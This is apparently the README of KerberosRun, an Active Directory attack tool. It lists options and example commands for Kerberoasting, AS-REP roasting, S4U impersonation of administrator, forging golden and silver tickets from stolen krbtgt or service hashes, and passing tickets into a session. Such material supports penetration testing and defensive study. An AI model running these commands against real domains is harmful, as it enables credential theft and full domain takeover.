# Authentication Flow Details

[AS Exchange](Authentication/AS_Exchange_DecryptedTGT.md)

[TGS Exchange: Unconstrained Delegation](Authentication/TGS_Exchange_UnconstrainedDelegation.md)

[TGS Exchange: S4U](Authentication/TGS_Exchange_S4U.md)

[TGS Exchange: Decrypted With PAC](Authentication/TGS_Exchange_DecryptedWithPAC.md)

[All In One](Authentication/AllInOne.md)



# KerberosRun


    Usage: KerberosRun.exe -h

    --Kerberoast            Kerberoasting
        --User*             (A valid username)
        --Pass              (A valid password)
     Or --RC4/AES128/AES256 (A valid hash)
        --Domain            (A valid domain name, default: current domain)
        --SPN*              Target SPN for Kerberoasting

    --Asreproast            ASREPRoasting
        --User*             (A valid username that does not require PreAuth)
        --Domain            (A valid domain name, default: current domain)
        --Format            Output Hash format (John/Hashcat, Default: Hashcat)

    --S4U2Self              Service for User to Self
        --User*             (A valid username that has SPN set)
        --Pass              (A valid password)
     Or --RC4/AES128/AES256 (A valid hash)
        --Domain            (A valid domain name, default: current domain)
        --ImperonsateUser*  (A user to impersonate)
        --PTT               Pass the ticket into current session

    --S4U                   S4U2Self and S4U2Proxy
        --User*             A valid username that has SPN set
        --Pass              (A valid password)
     Or --RC4/AES128/AES256 (A valid hash)
        --Domain            (A valid domain name, default: current domain)
        --Imperonsate*      (A user to impersonate)
        --SPN*              Target SPN for impersonate user
        --PTT               Pass the ticket into current session

    --Golden                Build a Golden Ticket
        --RC4/AES128/AES256 krbtgt account hash
        --DomainSid*        Domain SIDs
        --Domain            (A valid domain name, default: current domain)
        --UserID            User ID (default: 500)
        --User*             User name for the golden ticket
        --PTT               (Pass the ticket into current session)

    --Sliver                Make a Sliver Ticket
        --RC4/AES128/AES256 Service account hash
        --DomainSid*        Domain SID
        --Domain            (A valid domain name, default: current domain)
        --Service*          Service name (HTTP/CIFS/HOST...)
        --Host*             Target Servers
        --User*             User name for the sliver ticket
        --PTT               (Pass the ticket into current session)

    --Ticket                Pass base64 encoded kirbi ticket into current session

    Example:
        .\KerberosRun.exe --Asreproast --user username --verbose
        .\KerberosRun.exe --Kerberoast --user username --pass password --spn service/srv.domain.com
        .\KerberosRun.exe --Kerberoast --user username --rc4 [RC4Hash] --spn service/srv.domain.com
        .\KerberosRun.exe --S4U2Self --user username --aes128 [AES128Hash] --impersonateuser administrator --verbose
        .\KerberosRun.exe --S4U --user username --aes256 [AES256Hash] --impersonateuser administrator --spn ldap/dc1.domain.com --ptt
        .\KerberosRun.exe --golden --user administrator --userid 500 --domainsid  [DomainSID] --RC4 [krbtgtHash] --ptt
        .\KerberosRun.exe --sliver --user administrator --domainsid  [DomainSID] --RC4 [srvHash] --Service HTTP --HOST DC01$ -ptt
        .\KerberosRun.exe --Ticket Base64EncodedKirbiString
